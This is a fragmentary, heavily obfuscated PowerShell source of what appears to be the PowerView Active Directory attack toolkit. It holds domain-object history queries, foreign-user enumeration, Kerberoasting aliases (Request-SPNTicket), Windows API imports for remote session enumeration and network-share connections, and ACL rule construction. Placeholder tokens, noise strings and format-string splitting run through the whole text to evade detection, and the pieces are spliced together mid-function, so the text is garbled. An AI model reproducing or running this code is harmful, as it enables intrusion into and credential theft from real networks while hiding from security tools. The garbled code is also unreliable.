                    YoV{uP} = &(Z3b{3}{1}{0}{2}Z3b -f S5zConnecS5z,S5zt-S5z,S5ztionS5z,S5zTesS5z) -Count 1 -Quiet -ComputerName YoV{_}.Z3bprOIJKpIJKeRTIJKiesZ3b.Z3bDNSIJKHOIJKStNAmEZ3b
                }
                if (YoV{UIJKp}) {
                    if (YoV{psIJKBIJKOunIJKDpaIJKRAMEteIJKRS}[S5zRawS5z]) {
                        
                        YoV{COmIJKPuIJKTer} = YoV{_}
                        YoV{cOIJKMpIJKUTER}.Z3bpSIJKobJeCTZ3b.Z3bTIJKYPENAMIJKeSZ3b.(Z3b{1}{0}Z3b -fS5znsertS5z,S5zIS5z).Invoke(0, (Z3b{6}{0}{3}{2}{4}{5}{1}Z3b-fS5zieS5z,S5zter.RawS5z,S5z.S5z,S5zwS5z,S5zCS5z,S5zompuS5z,S5zPowerVS5z))
                    }
                    else {
                        YoV{cIJKOmIJKPUter} = &(Z3b{4}{2}{5}{3}{1}{0}Z3b -fS5zPropertyS5z,S5zPS5z,S5zvS5z,S5zrt-LDAS5z,S5zConS5z,S5zeS5z) -Properti','{4}{5}{2}{3}Z3b-fS5z_REPL_ATTRS5z,S5zDSS5z,S5zTA_DATS5z,S5zAS5z,S5z_MS5z,S5zES5z) -ErrorAction (Z3b{3}{0}{4}{1}{2}Z3b -fS5zilS5z,S5zntinS5z,S5zueS5z,S5zSS5z,S5zentlyCoS5z)
                if (YoV{tIJKEMPOIJKBJEIJKct}) {
                    if (YoV{teIJKmPObJEIJKct}.Z3bPSIJKzaTIJKTrIJKibUTIJKENIJKAMeZ3b -Match YoV{pIJKROPeRTyfIJKiIJKLTer}) {
                        YoV{outIJKpuT} = &(Z3b{0}{1}{2}Z3b -f S5zNS5z,S5zeS5z,S5zw-ObjectS5z) (Z3b{0}{1}Z3b-f S5zPSOS5z,S5zbjectS5z)
                        YoV{OuTIJKpIJKUT} JGO &(Z3b{1}{0}{2}Z3b -f S5zd-S5z,S5zAdS5z,S5zMemberS5z) (Z3b{1}{0}{2}Z3b -fS5zProperS5z,S5zNoteS5z,S5ztyS5z) (Z3b{2}{1}{0}Z3b -f S5zDNS5z,S5zbjectS5z,S5zOS5z) YoV{OIJKBIJKjEctdN}
                        YoV{oIJKUTIJKPUt} JGO &(Z3b{0}{1}{2}Z3b-f S5zAddS5z,S5z-MemS5z,S5zberS5z) (Z3b{2}{0}{1}Z3b-fS5zoteS5z,S5zPropertyS5z,S5zNS5z) (Z3b{2}{0}{1}Z3b-f S5zmS5z,S5zeS5z,S5zAttributeNaS5z) YoV{teIJKMpoIJKBJeIJKCT}.Z3bpszIJKATtrIJKIBUIJKTeIJKNamEZ3b
                        YoV{OutIJKpUT} JGO &(Z3b{0}{1}{2}Z3b -f S5zAdd-S5z,S5zMemS5z,S5zberS5z) (Z3b{2}{3}{1}{0}Z3b -f S5ztyS5z,S5zerS5z,S5zNotePS5z,S5zropS5z) (Z3b{5}{3}{0}{4}{2}{1}Z3b -fS5zOriginatiS5z,S5zeS5z,S5zChangS5z,S5zstS5z,S5zngS5z,S5zLaS5z) YoV{TIJKEmPOBIJKJIJKecT}.Z3bFIJKTImElASIJKToRiGINIJKAtIIJKNgIJKChangeZ3b
                        YoV{OutIJKpUT} JGO &(Z3b{1}{0}{2}Z3b-f S5z-MembeS5z,S5zAddS5z,S5zrS5z) (Z3b{1}{0}{2}Z3b-f S5zoS5z,S5zNS5z,S5ztePropertyS5z) (Z3b{0}{1}{2}Z3b -fS5zVS5z,S5zeS5z,S5zrsionS5z) YoV{TeIJKmIJKpobJIJKEcT}.Z3bdwVIJKeRSIJKiOnZ3b
                        YoV{oUtIJKPIJKUt} JGO &(Z3b{0}{2}{1}Z3b-fS5zAS5z,S5zerS5z,S5zdd-MembS5z) (Z3b{2}{1}{0}Z3b-fS5ztyS5z,S5zoperS5z,S5zNotePrS5z) (Z3b{0}{4}{3}{2}{6}{1}{5}Z3b -fS5zLasS5z,S5zatS5z,S5zigiS5z,S5zOrS5z,S5ztS5z,S5zingDsaDNS5z,S5znS5z) YoV{TEMpIJKObIJKJIJKECt}.Z3bPSIJKzlaIJKstOIJKRIgIJKINIJKAtiNgdIJKSAdNZ3b
                        YoV{oIJKUTPuT}.Z3bpSoIJKBIJKJEcTZ3b.Z3btyPENIJKAIJKMesZ3b.(Z3b{0}{1}{2}Z3b -fS5zIS5z,S5znseS5z,S5zrtS5z).Invoke(0, (Z3b{1}{4}{7}{0}{3}{6}{5}{2}Z3b-fS5zew.ADObjeS5z,S5zPS5z,S5ztoryS5z,S5zctS5z,S5zowerVS5z,S5zisS5z,S5zAttributeHS5z,S5ziS5z))
                        YoV{OUIJKTPUT}
                    }
                }
                else {
                    &(Z3b{2}{0}{1}Z3b-f S5z-VerS5z,S5zboseS5z,S5zWriteS5z) (S5z[GeS5z+S5zt-DoS5z+S5zmainObjectS5z+S5zAttrS5z+S5zibS5z+S5zuteHisS5z+S5ztory]S5z+S5z S5z+S5zES5z+S5zrror S5z+S5zretriS5z+S5zevinS5z+S5zgS5z+S5z S5z+(S5zny9S5z+S5zmsdS5z+S5zs-S5z+S5zreplattriS5z+S5zbuS5z+S5zteS5z+S5zmetadaS5z+S5ztS5z+S5zanyS5z+S5z9 S5z).Z3bREPIJKLIJKAceZ3b(([CHAR]110+[CHAR]121+[CHAR]57),[stRiNG][CHAR]39)+S5zforS5z+S5z S5z+Z3bS5zYoVObjectDNS5zZ3b)
                }
            }
        }
    }
}


function gETIJK-domAIIJKNObjEctIJKLiIJKNKEIJKdAIJKTTriIJKBuTeHIJKIsIJKTOIJKRY {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({Z3b{3}{8}{5}{10}{4}{6}{9}{0}{2}{7}{1}Z3b-f S5zMoreThanS5z,S5zentsS5z,S5zAsS5z,S5zPSUS5z,S5zaS5z,S5zeDecS5z,S5zrS5z,S5zsignmS5z,S5zsS5z,S5zedVarsS5z,S5zlS5z}, S5zS5z)]
    [OutputType({Z3b{5}{7}{2}{0}{6}{4}{1}{3}Z3b-f S5ziew.ADObjectS5z,S5zeS5z,S5zVS5z,S5zHistoryS5z,S5znkedAttributS5z,S5zPowS5z,S5zLiS5z,S5zerS5z})]
    [CmdletBinding()]
    Param(
        [Parameter(pOsitiOn = 0, VALuEFromPIpelINE = YoV{tIJKRUE}, ValUEFROmpiPeLiNEbYpRopErTYNAme = YoV{TrIJKUE})]
        [Alias({Z3b{5}{4}{2}{0}{1}{3}Z3b-fS5zingS5z,S5zuishedS5z,S5ztS5z,S5zNameS5','z,S5zarcheS5z,S5zt-DomainSeS5z) @SearcherArguments
                
                YoV(ForEach(YoV{UserIJKREsUIJKLt} in YoV{uIJKSerIJKsEARcIJKhIJKEr}.(Z3b{0}{1}Z3b-f S5zFinS5z,S5zdAllS5z).Invoke()) {if (YoV{userIJKRIJKEsuLT}.Z3bPROPeRIJKTIJKIESZ3b[(Z3b{2}{0}{1}Z3b -fS5zreS5z,S5zctoryS5z,S5zhomediS5z)]) {&(Z3b{2}{1}{0}Z3b -f S5zPathS5z,S5zplit-S5z,S5zSS','{1}Z3b -f S5zfS5z,S5zuncS5z) (Z3b{1}{0}Z3b -fS5zpi32S5z,S5zwtsaS5z) (Z3b{3}{4}{0}{2}{1}Z3b-fS5zSS5z,S5zxS5z,S5zerverES5z,S5zWTSOS5z,S5zpenS5z) ([IntPtr]) @([String])),
    (&(Z3b{1}{0}Z3b-f S5zuncS5z,S5zfS5z) (Z3b{2}{0}{1}Z3b -fS5zaS5z,S5zpi32S5z,S5zwtsS5z) (Z3b{3}{0}{2}{1}Z3b -fS5zEnS5z,S5zrateSessionsExS5z,S5zumeS5z,S5zWTSS5z) ([Int]) @([IntPtr],  (  &(Z3b{1}{0}{2}Z3b -f S5zEt-iteS5z,S5zGS5z,S5zMS5z) VariAblE:r269f).Z3bvaLIJKUeZ3b.(Z3b{1}{3}{2}{0}Z3b-f S5zpeS5z,S5zMakeS5z,S5zefTyS5z,S5zByRS5z).Invoke(), [Int],   (  &(Z3b{2}{1}{0}Z3b-f S5zRIabLES5z,S5zaS5z,S5zvS5z) (S5z6rkS5z+S5z25PS5z) ).Z3bVIJKAlUEZ3b.(Z3b{0}{2}{1}{3}Z3b-f S5zMakeS5z,S5zefTypS5z,S5zByRS5z,S5zeS5z).Invoke(),   YoV{RIJK26IJK9f}.(Z3b{2}{3}{0}{1}Z3b -fS5zTypS5z,S5zeS5z,S5zMaS5z,S5zkeByRefS5z).Invoke()) -SetLastError),
    (&(Z3b{0}{1}Z3b-f S5zfuS5z,S5zncS5z) (Z3b{2}{1}{0}Z3b-f S5z2S5z,S5ztsapi3S5z,S5zwS5z) (Z3b{4}{3}{5}{2}{1}{0}Z3b -f S5zationS5z,S5zormS5z,S5zInfS5z,S5zQS5z,S5zWTSS5z,S5zuerySessionS5z) ([Int]) @([IntPtr], [Int], [Int],  (&(Z3b{1}{0}Z3b -fS5zTemS5z,S5zIS5z) variabLE:6rK25P).Z3bVALIJKUEZ3b.(Z3b{1}{0}{2}{3}Z3b-f S5zeS5z,S5zMakS5z,S5zByRefS5z,S5zTypeS5z).Invoke(),  (  &(Z3b{0}{1}{2}Z3b -f S5zgS5z,S5zeS5z,S5zt-chiLDiteMS5z) (S5zvaRiABS5z+S5zle:r2S5z+S5z6S5z+S5z9FS5z)).Z3bvalIJKUEZ3b.(Z3b{2}{1}{4}{3}{0}Z3b -f S5zTypeS5z,S5zeBS5z,S5zMakS5z,S5zRefS5z,S5zyS5z).Invoke()) -SetLastError),
    (&(Z3b{1}{0}Z3b-fS5zcS5z,S5zfunS5z) (Z3b{1}{0}Z3b-fS5zapi32S5z,S5zwtsS5z) (Z3b{0}{2}{1}{3}Z3b-fS5zWS5z,S5zFrS5z,S5zTSS5z,S5zeeMemoryExS5z) ([Int]) @([Int32], [IntPtr], [Int32])),
    (&(Z3b{1}{0}Z3b -fS5zncS5z,S5zfuS5z) (Z3b{0}{1}Z3b -fS5zwtS5z,S5zsapi32S5z) (Z3b{1}{3}{2}{0}Z3b-fS5zeeMemoryS5z,S5zWS5z,S5zSFrS5z,S5zTS5z) ([Int]) @([IntPtr])),
    (&(Z3b{1}{0}Z3b-f S5zncS5z,S5zfuS5z) (Z3b{1}{0}{2}Z3b-fS5zapi3S5z,S5zwtsS5z,S5z2S5z) (Z3b{0}{1}{2}Z3b -fS5zWS5z,S5zTS5z,S5zSCloseServerS5z) ([Int]) @([IntPtr])),
    (&(Z3b{0}{1}Z3b -f S5zfunS5z,S5zcS5z) (Z3b{0}{1}Z3b-fS5zMS5z,S5zprS5z) (Z3b{3}{1}{4}{0}{2}Z3b-fS5zctS5z,S5zNetS5z,S5zion2WS5z,S5zWS5z,S5zAddConneS5z) ([Int]) @(YoV{nIJKEtREsIJKourceW}, [String], [String], [UInt32])),
    (&(Z3b{1}{0}Z3b -fS5zcS5z,S5zfunS5z) (Z3b{0}{1}Z3b-fS5zMpS5z,S5zrS5z) (Z3b{2}{0}{5}{4}{1}{3}Z3b-fS5zancelConS5z,S5zoS5z,S5zWNetCS5z,S5zn2S5z,S5ziS5z,S5znectS5z) ([Int]) @([String], [Int], [Bool])),
    (&(Z3b{1}{0}Z3b-fS5zncS5z,S5zfuS5z) (Z3b{1}{0}Z3b -fS5zernel32S5z,S5zkS5z) (Z3b{1}{0}{2}Z3b-fS5zdlS5z,S5zCloseHanS5z,S5zeS5z) ([Bool]) @([IntPtr]) -SetLastError)
)

YoV{tYIJKpEs} = YoV{FuIJKNcTIONdeIJKFIJKINitIJKiOIJKNS} JGO &(Z3b{2}{3}{0}{1}Z3b-f S5zyS5z,S5zpeS5z,S5zAdd-S5z,S5zWin32TS5z) -Module YoV{mIJKOd} -Namespace (Z3b{1}{0}Z3b-f S5z32S5z,S5zWinS5z)
YoV{NetaIJKpi32} = YoV{tIJKYpes}[(Z3b{1}{0}Z3b-fS5zapi32S5z,S5znetS5z)]
YoV{adIJKVApIJKi32} = YoV{TYIJKpEs}[(Z3b{1}{0}{2}Z3b-f S5zdvapS5z,S5zaS5z,S5zi32S5z)]
YoV{wtsApIIJK32} = YoV{TYIJKPEs}[(Z3b{0}{2}{1}Z3b -fS5zwtsS5z,S5zpi32S5z,S5zaS5z)]
YoV{mIJKPR} = YoV{tIJKyIJKpes}[S5zMprS5z]
YoV{kIJKerNeLIJK32} = YoV{tYIJKPIJKes}[(Z3b{1}{2}{0}Z3b -fS5z2S5z,S5zkeS5z,S5zrnel3S5z)]

&(Z3b{2}{1}{0}Z3b -f S5zasS5z,S5zt-AliS5z,S5zSeS5z) (Z3b{0}{1}{2}Z3b -f S5zGS5z,S5zet-S5z,S5zIPAddressS5z) (Z3b{0}{3}{2}{1}Z3b-fS5zReS5z,S5zessS5z,S5zrS5z,S5zsolve-IPAddS5z)
&(Z3b{2}{1}{0}Z3b-f S5zAliasS5z,S5zet-S5z,S5zSS5z) (Z3b{2}{3}{1}{0}Z3b-f S5zSidS5z,S5z-NameToS5z,S5zConverS5z,S5ztS5z) (Z3b{0}{1}{2}Z3b-f S5zConvertS5z,S5zTS5z,S5zo-SIDS5z)
&(Z3b{0}{2}{1}Z3b -fS5zSS5z,S5z-AliasS5z,S5zetS5z) (Z3b{3}{4}{1}{0}{2}Z3b-fS5zNamS5z,S5zToS5z,S5zeS5z,S5zConveS5z,S5zrt-SidS5z) (Z3b{2}{0}{1}Z3b-fS5zvertFrom-S5z,S5zSIDS5z,S5zConS5z)
&(Z3b{1}{0}Z3b-fS5zAliasS5z,S5zSet-S5z) (Z3b{0}{1}{2}{4}{3}Z3b-fS5zRequesS5z,S5ztS5z,S5z-SPNTS5z,S5zketS5z,S5zicS5z) (Z3b{3}{0}{2}{1}{4}Z3b -f S5zet-S5z,S5zmaiS5z,S5zDoS5z,S5zGS5z,S5znSPNTicketS5z)
&(Z3b{1}{0}Z3b-f S5zt-AliasS5z,S5zSeS5z) (Z3b{0}{2}{1}Z3b -fS5zGet-S5z,S5zZoneS5z,S5zDNSS5z) (Z3b{3}{4}{0}{2}{1}Z3b-f S5zt-S5z,S5zNSZoneS5z,S5zDomainDS5z,S5zGS5z,S5zeS5z)
&(Z3b{1}{0}Z3b-fS5ziasS5z,S5zSet-AlS5z) (Z3b{4}{0}{1}{2}{3}Z3b-f S5zet-S5z,S5zDNSS5z,S5zRecoS5z,S5zrdS5z,S5zGS5z) (Z3b{2}{0}{3}{1}Z3b -f S5zinDNSS5z,S5zrdS5z,S5zGet-DomaS5z,S5zRecoS5z)
&(Z3b{1}{0}{2}Z3b -fS5zt-AS5z,S5zSeS5z,S5zliasS5z) (Z3b{0}{1}{2}Z3b-f S5zGet-NetDomS5z,S5zaiS5z,S5znS5z) (Z3b{2}{0}{3}{1}Z3b -f S5zetS5z,S5zmainS5z,S5zGS5z,S5z-DoS5z)
&(Z3b{1}{0}{2}Z3b -f S5z-AliaS5z,S5zSetS5z,S5zsS5z) (Z3b{4}{3}{0}{1}{2}Z3b-fS5zntroS5z,S5zllS5z,S5zerS5z,S5zet-NetDomainCoS5z,S5zGS5z) (Z3b{3}{1}{2}{0}Z3b -f S5zllerS5z,S5znS5z,S5zControS5z,S5zGet-DomaiS5z)
&(Z3b{1}{2}{0}Z3b-fS5zasS5z,S5zSet-AS5z,S5zliS5z) (Z3b{1}{0}{2}Z3b-f S5zetForS5z,S5zGet-NS5z,S5zestS5z) (Z3b{1}{2}{0}{3}Z3b -f S5zoresS5z,S5zGeS5z,S5zt-FS5z,S5ztS5z)
&(Z3b{0}{2}{1}Z3b -f S5zSet-AliS5z,S5zsS5z,S5zaS5z) (Z3b{4}{1}{2}',' [Alias({Z3b{0}{1}{2}Z3b -fS5zFilS5z,S5ztS5z,S5zerS5z})]
        [String]
        YoV{LdaIJKPfiLTIJKER},

        [ValidateNotNullOrEmpty()]
        [String[]]
        YoV{PropIJKErIJKTiIJKEs},

        [ValidateNotNullOrEmpty()]
        [Alias({Z3b{1}{2}{0}Z3b -f S5zthS5z,S5zADSS5z,S5zPaS5z})]
        [String]
        YoV{SEarIJKcHbaIJKSE},

        [ValidateNotNullOrEmpty()]
        [Alias({Z3b{4}{3}{0}{1}{2}Z3b-fS5znCoS5z,S5zntrolS5z,S5zlerS5z,S5zomaiS5z,S5zDS5z})]
        [String]
        YoV{SErIJKVEr},

        [ValidateSet({Z3b{0}{1}Z3b -f S5zBaS5z,S5zseS5z}, {Z3b{1}{0}{2}Z3b-fS5zveS5z,S5zOneLeS5z,S5zlS5z}, {Z3b{0}{1}Z3b-f S5zSubS5z,S5ztreeS5z})]
        [String]
        YoV{SIJKeArIJKCHSCIJKOPE} = (Z3b{1}{0}Z3b -f S5zeS5z,S5zSubtreS5z),

        [ValidateRange(1, 10000)]
        [Int]
        YoV{rIJKesuLTPaGEIJKsize} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        YoV{SERvertImeIJKlIJKiMit},

        [ValidateSet({Z3b{0}{1}Z3b-f S5zDacS5z,S5zlS5z}, {Z3b{0}{1}Z3b-f S5zGS5z,S5zroupS5z}, {Z3b{1}{0}Z3b -f S5zneS5z,S5zNoS5z}, {Z3b{1}{0}Z3b-fS5zrS5z,S5zOwneS5z}, {Z3b{0}{1}Z3b -fS5zSacS5z,S5zlS5z})]
        [String]
        YoV{sECUIJKRIJKitYMaIJKSKs},

        [Switch]
        YoV{toIJKMbIJKsIJKTONE},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        YoV{cIJKRIJKeDeIJKNTIal} =  YoV{jIJKFI}::Z3beIJKMPTyZ3b
    )

    BEGIN {
        YoV{sIJKeARIJKCHERArgUMeIJKNTs} = @{}
        YoV{SeAIJKRcheraIJKRguIJKmEnTs}[(Z3b{2}{0}{1}Z3b-fS5zilteS5z,S5zrS5z,S5zLDAPFS5z)] = (Z3b{1}{2}{0}{3}Z3b-fS5zfS5z,S5z(meS5z,S5zmberoS5z,S5z=*)S5z)
        if (YoV{PIJKSBIJKOIJKUnDpIJKARaMETeRS}[(Z3b{0}{1}Z3b-fS5zDomaiS5z,S5znS5z)]) { YoV{SeIJKARcheIJKRAIJKRgUIJKmENIJKTS}[(Z3b{0}{1}Z3b -f S5zDomS5z,S5zainS5z)] = YoV{doIJKMAIN} }
        if (YoV{pSBOUnIJKDpAIJKRamEteIJKRS}[(Z3b{2}{1}{0}{3}Z3b -fS5ztieS5z,S5zerS5z,S5zPropS5z,S5zsS5z)]) { YoV{SEIJKARcheRIJKARGuMIJKenTS}[(Z3b{2}{0}{1}Z3b -f S5zroS5z,S5zpertiesS5z,S5zPS5z)] = YoV{PROPEIJKRTIIJKES} }
        if (YoV{PSIJKBIJKOUnDpArIJKAMeteIJKRs}[(Z3b{1}{3}{2}{0}Z3b -f S5zseS5z,S5zSeaS5z,S5zBaS5z,S5zrchS5z)]) { YoV{SEAIJKRCHIJKeRIJKAIJKRIJKgUmenTs}[(Z3b{2}{1}{0}Z3b-f S5zeS5z,S5zhBasS5z,S5zSearcS5z)] = YoV{searIJKcHIJKBaSe} }
        if (YoV{pSBoUIJKNIJKDpaIJKRameTEIJKRS}[(Z3b{0}{1}Z3b-f S5zServS5z,S5zerS5z)]) { YoV{SEArcHeIJKRIJKArgUIJKmeIJKNtS}[(Z3b{1}{0}Z3b-fS5zrverS5z,S5zSeS5z)] = YoV{sIJKEIJKRveR} }
        if (YoV{PSbIJKoUndParIJKAMIJKETErs}[(Z3b{2}{0}{1}Z3b -fS5zchS5z,S5zScopeS5z,S5zSearS5z)]) { YoV{sEIJKARcheRIJKAIJKRgUMEIJKNIJKTs}[(Z3b{0}{1}{2}Z3b-fS5zSeS5z,S5zarchScoS5z,S5zpeS5z)] = YoV{SeaRCIJKhSCOIJKpe} }
        if (YoV{PsBOIJKUNDpaIJKRaIJKMeTERS}[(Z3b{4}{2}{1}{3}{0}Z3b-fS5zizeS5z,S5zltPageS5z,S5zuS5z,S5zSS5z,S5zResS5z)]) { YoV{SEaIJKRcHErarguMeIJKNIJKTS}[(Z3b{1}{0}{2}{3}Z3b-f S5zsuS5z,S5zReS5z,S5zltPageSizS5z,S5zeS5z)] = YoV{REIJKsuIJKLIJKTPaGeIJKsIzE} }
        if (YoV{pIJKSIJKBOUNdpAIJKRAIJKmEteIJKRs}[(Z3b{4}{1}{0}{3}{2}Z3b-fS5zrTiS5z,S5zrveS5z,S5zeLimitS5z,S5zmS5z,S5zSeS5z)]) { YoV{seaRcIJKheIJKRaRguMIJKeNtS}[(Z3b{3}{2}{0}{1}Z3b -fS5zTimeLimS5z,S5zitS5z,S5zverS5z,S5zSerS5z)] = YoV{sIJKeRVIJKERtImeLiIJKMIJKiT} }
        if (YoV{pIJKSbOunIJKDpARAIJKMeIJKTers}[(Z3b{0}{2}{1}Z3b -fS5zSecuS5z,S5zMasksS5z,S5zrityS5z)]) { YoV{SEARIJKcheRArgIJKUIJKmIJKENTS}[(Z3b{0}{2}{1}{3}Z3b-fS5zSS5z,S5zrS5z,S5zecuS5z,S5zityMasksS5z)] = YoV{sIJKecIJKUrIJKItYMIJKASKs} }
        if (YoV{pIJKsboIJKUnDPaRAMetEIJKRS}[(Z3b{2}{1}{0}{3}Z3b -fS5ztonS5z,S5zmbsS5z,S5zToS5z,S5zeS5z)]) { YoV{sIJKeaIJKRCheraIJKRgIJKUmeNIJKTS}[(Z3b{2}{1}{0}Z3b -fS5zneS5z,S5ztoS5z,S5zTombsS5z)] = YoV{ToMBSIJKTIJKOIJKNE} }
        if (YoV{PsIJKBoUndpArIJKAIJKmETERs}[(Z3b{0}{1}{2}Z3b -fS5zCredentS5z,S5ziS5z,S5zalS5z)]) { YoV{seaRIJKchIJKerargumIJKeNts}[(Z3b{0}{2}{1}Z3b-f S5zCS5z,S5zedentialS5z,S5zrS5z)] = YoV{cReDIJKeIJKNIJKTiAL} }
        if (YoV{PSbouIJKNIJKDpAIJKRAMIJKEteRs}[S5zRawS5z]) { YoV{sEIJKArcheRAIJKRIJKgIJKUMEnTS}[S5zRawS5z] = YoV{RIJKAw} }
    }

    PROCESS {
        &(Z3b{0}{2}{1}{4}{3}Z3b -fS5zGetS5z,S5zmS5z,S5z-DoS5z,S5znUserS5z,S5zaiS5z) @SearcherArguments  JGO &(Z3b{0}{2}{3}{1}Z3b -fS5zFS5z,S5zctS5z,S5zorEachS5z,S5z-ObjeS5z) {
            ForEach (YoV{MIJKeMbersIJKHIp} in YoV{_}.Z3bmEIJKmIJKBErOfZ3b) {
                YoV{inDIJKex} = YoV{meMbERIJKsIJKhIJKIp}.(Z3b{0}{1}Z3b -fS5zIndexS5z,S5zOfS5z).Invoke(S5zDC=S5z)
                if (YoV{inIJKDeX}) {

                    YoV{GIJKRIJKouPDoMaIJKIN} = YoV(YoV{mEmBERSIJKhIJKip}.(Z3b{1}{2}{0}Z3b-f S5zingS5z,S5zSS5z,S5zubStrS5z).Invoke(YoV{iIJKNIJKDex})) -replace S5zDC=S5z,S5zS5z -replace S5z,S5z,S5z.S5z
                    YoV{UIJKSErDIsTIJKingUISheIJKdNAIJKme} = YoV{_}.Z3bDIJKisIJKTiIJKNGuIIJKsHeDNaIJKMEZ3b
                    YoV{useIJKRiNdIJKeX} = YoV{usErIJKDIsIJKTIJKIngUISHeIJKDIJKNaIJKME}.(Z3b{0}{1}Z3b-f S5zIndexS5z,S5zOfS5z).Invoke(S5zDC=S5z)
                    YoV{uSEIJKRdoIJKMIJKAIn} = YoV(YoV{_}.Z3bdiStIIJKNgIJKUIIJKSHeDIJKNAmEZ3b.(Z3b{2}{0}{1}Z3b-f S5zbStrS5z,S5zingS5z,S5zSuS5z).Invoke(YoV{uIJKSerInIJKdex})) -replace S5zDC=S5z,S5zS5z -replace S5z,S5z,S5z.S5z

                    if (YoV{GrIJKOUPdoMIJKAin} -ne YoV{USeIJKRIJKdOMIJKAIN}) {
                        
                        YoV{gRoupIJKNAIJKME} = YoV{mIJKemBERIJKsHIp}.(Z3b{1}{0}Z3b-fS5zitS5z,S5zSplS5z).Invoke(S5z,S5z)[0].(Z3b{0}{1}Z3b -f S5zsS5z,S5zplitS5z).Invoke(S5z=S5z)[1]
                        YoV{ForEiIJKGnIJKUSEr} = &(Z3b{0}{2}{3}{1}Z3b-f S5zNew-OS5z,S5ztS5z,S5zbjeS5z,S5zcS5z) (Z3b{1}{0}{2}Z3b -f S5zObjeS5z,S5zPSS5z,S5zctS5z)
                        YoV{fOrEIJKIGIJKNuseR} JGO &(Z3b{0}{2}{1}Z3b -fS5zAS5z,S5zmberS5z,S5zdd-MeS5z) (Z3b{1}{2}{0}{3}Z3b-f S5zropertS5z,S5zNoS5z,S5ztepS5z,S5zyS5z) (Z3b{0}{1}{2}Z3b -fS5zUseS5z,S5zrDomaiS5z,S5znS5z) YoV{usIJKeRDomAIJKiN}
                ','cS5z,S5zjeS5z) @SearcherArguments JGO &(Z3b{2}{0}{1}{3}Z3b -fS5zacS5z,S5zh-ObjeS5z,S5zForES5z,S5zctS5z) {
            YoV{ObIJKJIJKEctdn} = YoV{_}.Z3bpRIJKopeRIJKTieSZ3b[(Z3b{2}{3}{1}{0}{4}Z3b-fS5zhS5z,S5zisS5z,S5zdistiS5z,S5znguS5z,S5zednameS5z)][0]
            ForEach(YoV{XMlIJKNIJKoDE} in YoV{_}.Z3bprOpIJKerIJKTIeSZ3b[(Z3b{4}{2}{1}{0}{3}Z3b-fS5zutemetadatS5z,S5zbS5z,S5zs-replattriS5z,S5zaS5z,S5zmsdS5z)]) {
                YoV{tIJKEmPobIJKJeIJKct} = [xml]YoV{xMIJKlIJKNoDe} JGO &(Z3b{3}{1}{2}{0}Z3b-fS5z-ObjectS5z,S5zcS5z,S5ztS5z,S5zSeleS5z) -ExpandProperty (Z3b{1}{0}','YoV{trIJKUE})]
        [ValidateNotNullOrEmpty()]
        [Alias({Z3b{1}{3}{0}{2}Z3b -fS5zainNaS5z,S5zDS5z,S5zmeS5z,S5zomS5z}, {Z3b{1}{0}Z3b -fS5zeS5z,S5zNamS5z})]
        [String[]]
        YoV{dOMAIJKiN},

        [ValidateNotNullOrEmpty()]
        [Alias({Z3b{2}{1}{0}Z3b-f S5zSPathS5z,S5zDS5z,S5zAS5z})]
        [String]
        YoV{SIJKeaRcIJKHBaSE},

        [ValidateNotNullOrEmpty()]
        [Alias({Z3b{1}{2}{3}{0}Z3b -f S5zlerS5z,S5zDS5z,S5zomainCS5z,S5zontrolS5z})]
        [String]
        YoV{sERIJKVER},

     ','ervices.ActiveDirectoryRights]YoV{R}).Z3bvALIJKUe__Z3b)
        }
        YoV{AdIJKRIIJKGht} = [System.DirectoryServices.ActiveDirectoryRights]YoV{aIJKDRiGHt}

        YoV{iDeNIJKTIJKiTY} = [System.Security.Principal.IdentityReference] ([System.Security.Principal.SecurityIdentifier]YoV{oBIJKjecIJKTIJKSID})
    }

    Process {
        if(YoV{PscIJKmdlet}.pArAMeTersETNAmE -eq (Z3b{2}{3}{1}{0}Z3b-f S5zypeS5z,S5zleTS5z,S5zAudiS5z,S5ztRuS5z)) {

            if(YoV{obIJKjeIJKctType} -eq YoV{NuIJKlL} -and YoV{INIJKhIJKeRiTaIJKNcetyPE} -eq  (  &(Z3b{0}{1}Z3b-f S5zVaRS5z,S5ziaBlES5z) QpU29 -VAl)::Z3bEMPIJKTyZ3b -and YoV{inHERItIJKEIJKdoBjECIJKTTYPe} -eq YoV{nIJKULL}) {
                &(Z3b{1}{0}{2}Z3b -fS5zjS5z,S5zNew-ObS5z,S5zectS5z) (Z3b{3}{7}{5}{6}{1}{2}{0}{8}{4}Z3b-fS5zveDirectoryS5z,S5zervicesS5z,S5z.ActiS5z,S5zSyS5z,S5zitRuleS5z,S5z.DirecS5z,S5ztorySS5z,S5zstemS5z,S5zAudS5z) -ArgumentList YoV{iIJKDEIJKNIJKTiTy}, YoV{AIJKDriGht}, YoV{aIJKUdIJKItFLag}
            } elseif(YoV{oBJeIJKCIJKTTYpe} -eq YoV{NUIJKLL} -and YoV{iIJKNheIJKRItaIJKNCIJKEtype} -ne  (  &(Z3b{2}{0}{3}{1}Z3b -f S5zET-S5z,S5zABleS5z,S5zgS5z,S5zVArIS5z)  Qpu29  ).Z3bVIJKAlUeZ3b::Z3bemPIJKTYZ3b -and YoV{iNhERIJKITedOBJIJKecIJKTtypE} -eq YoV{NIJKUll}) {
                &(Z3b{2}{1}{0}Z3b -f S5zbjectS5z,S5zew-OS5z,S5zNS5z) (Z3b{6}{11}{4}{1}{7}{5}{9}{12}{10}{0}{13}{14}{8}{2}{3}Z3b-f S5ztivS5z,S5zDiS5z,S5zryAuditRulS5z,S5zeS5z,S5zm.S5z,S5zSerS5z,S5zSS5z,S5zrectoryS5z,S5ztoS5z,S5zvS5z,S5zAcS5z,S5zysteS5z,S5zices.S5z,S5zeDS5z,S5zirecS5z) -ArgumentList YoV{iDIJKeIJKNTItY}, YoV{adrIIJKGhT}, YoV{AuDiTIJKFlIJKAG}, ([System.DirectoryServices.ActiveDirectorySecurityInheritance]YoV{InIJKHerIIJKTAnIJKCeTYPE})
            } elseif(YoV{oBjeCtTIJKYIJKpe} -eq YoV{nUIJKlL} -and YoV{iNhERItAIJKNCETYIJKPe} -ne   (  &(S5zLSS5z)  (Z3bvAriZ3b+Z3bAZ3b+Z3bBlZ3b+Z3bE:qpU29Z3b)  ).Z3bvAIJKLueZ3b::Z3bEmIJKPtyZ3b -and YoV{INIJKHErITIJKEdOBIJKJIJKECtTYPe} -ne YoV{nIJKULL}) {
